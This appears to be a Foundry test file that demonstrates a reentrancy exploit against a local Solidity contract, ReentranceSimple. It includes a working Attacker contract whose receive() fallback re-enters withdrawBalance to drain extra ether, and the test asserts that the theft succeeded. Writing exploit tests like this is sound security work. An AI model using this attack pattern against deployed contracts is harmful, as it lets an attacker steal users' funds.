
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentranceSimple} from "../src/ReentranceSimple.sol";

contract TestReentrancyReentranceSimple is Test {
    ReentranceSimple public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentranceSimple();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.1 ether && attackVal < 1000 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required other than funding handled below.

        // --- 3. Funding ---
        
        // A. Fund the Victim (so it has ETH to steal)
        // We fund it with more than the attack value to ensure the reentrant call has funds to withdraw.
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ReentranceSimple public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = ReentranceSimple(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to establish a balance to withdraw
        victim.addToBalance{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 3. Call the vulnerable function.
        victim.withdrawBalance();

        // 4. Verify Success Conditions.
        // If reentrancy worked, we withdrew the balance twice (once in the first call, once in the reentrant call).
        // Therefore, our balance should have increased by 2 * val.
        if (address(this).balance >= initialSnapshot + (2 * val)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            victim.withdrawBalance();
        }
    }
}
